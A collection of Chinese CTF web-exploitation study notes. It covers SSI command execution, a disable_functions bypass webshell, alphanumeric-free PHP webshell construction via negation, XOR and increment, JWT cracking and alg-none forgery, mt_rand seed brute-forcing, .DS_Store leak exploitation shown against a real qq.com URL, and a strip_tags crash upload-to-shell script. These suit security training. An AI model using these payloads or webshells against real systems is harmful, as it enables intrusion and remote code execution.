Input Signature: d4bd0b631614327be0367efa305057e5
Input Data: flag.txtscan  (本来追加在secret_key后面的已知数据)
Input Key Length: 16  (secret_key的长度)
Input Data to Add: read  (为了计算新的sign值,我们希望添加的新数据)
aeccfcf28d2da89a3c8581a6c90d1842  (计算结果,新的sign值)
flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read  (新的secret_key后面的已知数据)

```



***

# shtml文件执行系统命令

`shtml`文件中写入如下格式就可以执行系统命令:

```
<!--#exec Cmd="命令"-->
例如:
<!--#exec Cmd="ls /"-->
```

例题见: [[BJDCTF2020]EasySearch](4f3ccb8a.html)



***

# 绕过php的disable_functions



本项目中有三个关键文件，`bypass_disablefunc.php`、`bypass_disablefunc_x64.so`、`bypass_disablefunc_x86.so`。

`bypass_disablefunc.php` 为命令执行` webshell`，提供三个 GET 参数：

(将`bypass_disablefunc.php`、`bypass_disablefunc_x64.so`传到目标后,访问`bypass_disablefunc.php`并传参来执行命令)

```
http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so
```

一是 `cmd` 参数，待执行的系统命令（如 `pwd`）；

二是 `outpath` 参数，保存命令执行输出结果的文件路径（如` /tmp/xx`），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、`web` 是否可跨目录访问、文件将被覆盖和删除等几点；

三是 `sopath` 参数，指定劫持系统函数的共享对象的绝对路径（如 `/var/www/bypass_disablefunc_x64.so`），另外关于该参数，你应注意 `web` 是否可跨目录访问到它。此外，`bypass_disablefunc.php` 拼接命令和输出路径成为完整的命令行，所以你不用在 `cmd` 参数中重定向。

**想办法将 `bypass_disablefunc.php` 和 `bypass_disablefunc_x64.so` 传到目标**，指定好三个 GET 参数后，`bypass_disablefunc.php` 即可突破` disable_functions`。执行 `cat /proc/meminfo`：

具体使用见[[极客大挑战 2019]RCE ME](4f3ccb8a.html)



***

# 无字母数字的RCE

## 1取反绕过

**取反运算(化成2进制之后,0变1,1变0),所以每一个字符在取反之后都会变成别的字符**

例如需要通过取反来构造: `assert(eval($_GET[_]))`那么就可以:

```
<?php
echo urlencode(~"assert");
echo '<br>';
echo urlencode(~"eval(\$_GET[_])");
echo '<br>';
?>
得到:
%9E%8C%8C%9A%8D%8B --assert
%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6 --eval(\$_POST[1])

那么: assert(eval($_POST[1]));就是:
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);

接下来再从POST中给1这个参数传具体命令,就可以执行了
```



## 2异或绕过

`php`中可以将两个字符按位异或, 就是相同则为0,不同则为1

那么我们可以通过非字母数字的字符进行异或而得到字母或数字:

```php
<?php
# 通过GET来传我们需要转换的字母
$a = $_GET['char'];
# 取所有非字母数字字符的ascii码
$ascii_num = array_merge(range(33,47),range(58,64),range(91,96),range(123,126));
# var_dump($ascii_num);
foreach($ascii_num as $char1)
{
    foreach($ascii_num as $char2)
    {
        $res = chr($char1) ^ chr($char2);
        if($res==$a)
        {
            echo chr($char1).'^'.chr($char2).'='.$res.'<br>';
            echo urlencode(chr($char1)).'^'.urlencode(chr($char2)).'='.$res.'<br>';
            echo '<br>';
        }
    }
}
#echo '}' ^ ':';
echo('aaa');
?>
```

例如要构造`assert($_POST[_])` 这里将字符`url`编码一下

```
a:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'
P:'%0D'^'%5D' ; O:'%0F'^'%40' ; S:'%0E'^'%5D' ; T:'%0B'^'%5F'
拼接起来：字符之间用.来连接
$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');  // $_=assert
$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');  // $__=_POST
$___=$$__; //$___=$_POST
$_($___[_]);//assert($_POST[_]);
放到一排就是：
$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');$___=$$__;$_($___[_]);
翻译过来就是:
$_=assert;$__=_POST;$___=$$__;$_($___[_]);

$$__ 也即是$_POST
```

## 3自增绕过

PHP中, 若有`$a = 'a'; $a++;`则将得到`b`, 大写字母也是一样

也就是说，只要我们获得了小写字母`a`，就可以通过自增获得所有小写字母，当我们获得大写字母`A`，就可以获得所有大写字母了

而如果强制连接数组和字符串, 数组就会被强制转换成字符串，它的值就为`'Array'`, 那么就可以通过`'Array'`来拿到`a`和`A`

```php
<?php
$a = '';
$b = [];
$c = $a.$b;
echo $c.'<br>';
echo $c[0].'<br>';
echo $c[3].'<br>';
$d = $c[0];
$d ++;
echo $d.'<br>';
?>
//输出:
//Array
//A
//a
//B
```

逐个字母构造`ASSERT($_POST[_]);`:

```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

有点太长了...



# jsfuck编码

![image-20221025094059162](file:///F:/blog/source/images/buuctf-web2/image-20221025094059162.png?lastModify=1666659384)

> **这一串是`jsfuck`代码,将一切的`JavaScript`代码混淆为`[]()!+,\"$.:;_{}~=`这十八个字符的排列组合**
>
> **这些代码是直接可以在控制台执行的,也可以到网站上解码得到能读的js编码**



***

# basename()函数删除部分字符特性

`basename`函数用于返回路径中的文件名部分,例如:

```
basename("/testweb/home.php") = "home.php"

如果设置了扩展名,则输出是不包含扩展名
basename("/testweb/home.php",".php") = "home"
```

`basename`在解析文件路径时,会忽略一部分非`ASCII`字符

可以测试以下有哪些字符会被忽略:

```php
<?php
highlight_file(__FILE__);
$filename = 'index.php';
for($i=0; $i<255; $i++){
    $filename = $filename.'/'.chr($i);    //变为 index/某字符
    if(basename($filename) === "index.php"){  //如果basename将"/某字符"删除, 则说明这个字符会被其忽略
        echo $i.'<br>';
    }
    $filename = 'index.php';
}
```

结果显示: `ascii`值为47、128-255的字符均会被其删除,其中47为"/", 另外会被删除的还包括汉字和中文标点

这样以来,如[[Zer0pts2020]Can you guess it](4f3ccb8a.html)

可以在文件名后面加上会被`basename`删除的字符来绕过正则匹配





# JWT伪造

>`JWT`的全称是`JSON Web Token`。遵循`JSON`格式，跨域认证解决方案。声明被存储在`客户端`，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于`token`的身份验证可以替代传统的cookie+session身份验证方法。
>
>整个`token`由三部分组成:`header`、`payload`、`signature`(用于认证信息的完整性)
>
>其中,`header`的格式为
>
>```json
>{
>  "alg": "HS256",   //signature部分的加密算法,可以为None,
>  "typ": "JWT"      //声明类型为JWT
>}
>```
>
>`payload`格式为:
>
>```json
>{
>    "user_role" : "finn",    	//当前登录用户
>    "iss": "admin",          	//该JWT的签发者,有些是URL
>    "iat": 1573440582,        //签发时间
>    "exp": 1573940267,        //过期时间
>    "nbf": 1573440582,        //该时间之前不接收处理该Token
>    "domain": "example.com",   //面向的用户
>    "jti": "dff4214121e83057655e10bd9751d657"   //Token唯一标识
>}
>```
>
>`signature`通过指定的加密算法, **以及一个用户指定的`secret_key`,** 对`header`、`payload`两部分进行计算得到. 签名可以为空,如果这样设置, 任何token都可以通过服务器的认证
>
>`header`、`payload`使用`base64url`编码, 所以和明文没什么区别



使用`c-jwt-cracker`工具可以对用于计算`signature`进行爆破 (只能爆破弱密钥)

使用`jwt_tool`可以对`JWT token`进行解码

```
┌──(kali㉿kali)-[~/Desktop/c-jwt-cracker/c-jwt-cracker]
└─$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o   
Secret is "1Kun"

python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.03HaDCk7C7vfJw9Wa-yDflSMoeV_1jpCaTILcgJXpZY

```

![image-20221025193722302](/images/ctfweb-others/image-20221025193722302.png)

https://jwt.io/

假如某个网站要求认证`admin`才能访问, 这里拿到爆破所得的`secret_key`, 并在解密后将`payload`中的`username`字段的值改为`admin`

从而计算得到一个新的`JWT token`

<img src="/images/ctfweb-others/image-20221025194112546.png" alt="image-20221025194112546" style="zoom:67%;" />

将新`token`替换`cookie`中旧的`token`后,成功访问到目标网页

```
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

## **使用`python`来计算新的`token`:**

```
conda install PyJWT
or
pip3 install PyJWT
```

```python
import jwt
def jwtencode():
    token = jwt.encode(
        {
            "secretid": [],
            "username": "admin",
            "password": "111",
            "iat": 1666939131
        },
        algorithm="none", key=""
    ).decode(encoding='utf-8')

    print(token)
jwtencode()
```









***

# mt_rand伪随机数爆破

>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>若使用的初值（种子）不变，那么伪随机数的数序也不变</span>:。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。
>
>**`mt_rand`就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。**

<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>也就是说,对于同一个`mt_srand(种子)`生成的种子, 后续每次调用`mt_rand`生成的随机数顺序都是固定的,例如第一次固定生成3,第二次固定生成20....</span>

这里可以用`php_mt_seed`来爆破种子, 有两种类型的数据可以提交, 一是某个种子的第一个`mt_rand`生成出来的完整数, 或者提交已知的多个随机数序列,使用方法为:

```
方法1: php_mt_seed xxx  这里xxx是用 mt_srand 播种后生成的第一个伪随机数

方法2: php_mt_seed a1 b1 c1 d1 a2 b2 c2 d2 a3 b3 c3 d3  其中a1,b1为在某个范围内生成的随机数, c1,d1是生成随机数时mt_rand指定的生成范围
例如第一次调用mt_rand(0,61) = 2 第二次调用mt_rand(0,61) = 30
那么这里就是php_mt_seed 2 2 0 61 30 30 0 61
```

那么使用脚本将目前已知的串转化为上面的形式

实际使用:

```
┌──(kali㉿kali)-[~/Desktop/php_mt_seed-4.0]
└─$ ./php_mt_seed 2 2 0 61 7 7 0 61 2 2 0 61 53 53 0 61 14 14 0 61 28 28 0 61 48 48 0 61 19 19 0 61 42 42 0 61 35 35 0 61        
Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
Version: 3.0.7 to 5.2.0
Found 0, trying 0xfc000000 - 0xffffffff, speed 1526.3 Mseeds/s 
Version: 5.2.1+
Found 0, trying 0x0e000000 - 0x0fffffff, speed 61.6 Mseeds/s 
seed = 0x0f8bea05 = 260827653 (PHP 7.1.0+)
Found 1, trying 0xfe000000 - 0xffffffff, speed 57.9 Mseeds/s 
Found 1
```

这里爆出的种子是 `260827653`,那么我们再自己拿`mt_srand(260827653)`来生成种子,再生成随机数, 每次生成出来的数也是一样的

***



# KOA

是一个用于处理网站静态文件的框架, 了解了之后再补充

有一个关键的路径为:

```
...../Controllers/api.js
```



# `.ds_store`文件泄露

> `.DS_Store`是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的`.DS_store`，**可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露**。

在SQL注入中的利用: [Comment](a65f6ebf.html)

如果在网站目录中扫描到了未被删除的`.DS_Store`文件, 可以使用[ds_store_exp](https://github.com/lijiejie/ds_store_exp)工具来利用, 解析`.DS_Store`文件并将目录下的文件递归下载到本地

用法:

```
ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store

hd.zj.qq.com/
└── themes
    └── galaxyw
        ├── app
        │   └── css
        │       └── style.min.css
        ├── cityData.min.js
        ├── images
        │   └── img
        │       ├── bg-hd.png
        │       ├── bg-item-activity.png
        │       ├── bg-masker-pop.png
        │       ├── btn-bm.png
        │       ├── btn-login-qq.png
        │       ├── btn-login-wx.png
        │       ├── ico-add-pic.png
        │       ├── ico-address.png
        │       ├── ico-bm.png
        │       ├── ico-duration-time.png
        │       ├── ico-pop-close.png
        │       ├── ico-right-top-delete.png
        │       ├── page-login-hd.png
        │       ├── pic-masker.png
        │       └── ticket-selected.png
        └── member
            ├── assets
            │   ├── css
            │   │   ├── ace-reset.css
            │   │   └── antd.css
            │   └── lib
            │       ├── cityData.min.js
            │       └── ueditor
            │           ├── index.html
            │           ├── lang
            │           │   └── zh-cn
            │           │       ├── images
            │           │       │   ├── copy.png
            │           │       │   ├── localimage.png
            │           │       │   ├── music.png
            │           │       │   └── upload.png
            │           │       └── zh-cn.js
            │           ├── php
            │           │   ├── action_crawler.php
            │           │   ├── action_list.php
            │           │   ├── action_upload.php
            │           │   ├── config.json
            │           │   ├── controller.php
            │           │   └── Uploader.class.php
            │           ├── ueditor.all.js
            │           ├── ueditor.all.min.js
            │           ├── ueditor.config.js
            │           ├── ueditor.parse.js
            │           └── ueditor.parse.min.js
            └── static
                ├── css
                │   └── page.css
                ├── img
                │   ├── bg-table-title.png
                │   ├── bg-tab-say.png
                │   ├── ico-black-disabled.png
                │   ├── ico-black-enabled.png
                │   ├── ico-coorption-person.png
                │   ├── ico-miss-person.png
                │   ├── ico-mr-person.png
                │   ├── ico-white-disabled.png
                │   └── ico-white-enabled.png
                └── scripts
                    ├── js
                    └── lib
                        └── jquery.min.js

21 directories, 48 files
```



# PHP伪协议string.strip_tags带来的bug

这里的PHP版本为7.033, 有一个bug是:

>使用`php://filter/string.strip_tags`导致`php`崩溃清空堆栈重启，如果在同时上传了一个文件，**那么这个`tmp file`就会一直留在`tmp`目录**，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。
>
>可用版本:
>
>```
>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复
>• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复
>• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复
>```

那么利用这里漏洞,需要在通过文件包含使用`php://filter/string.strip_tags`的同时, 上传一个文件,这个文件将会被保存在`/tmp`目录下. 然后通过访问`dir.php`获得上传文件的文件名就可以了

可以通过脚本来实现传参+上传文件

```python
import requests
from io import BytesIO

url = "http://faf05418-21ed-4937-a2e0-0ba79a558d01.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"

phpfile = "<?php phpinfo();?>"  #这里是测试,换成一句话木马也可
filedata = {
    "file": phpfile
}

bak = requests.post(url=url, files=filedata)
print(bak.text)
```

运行之后,只要直到`/tmp`目录下被上传的文件名,就能够访问并执行了

题目:[ezinclude](a65f6ebf.html)



























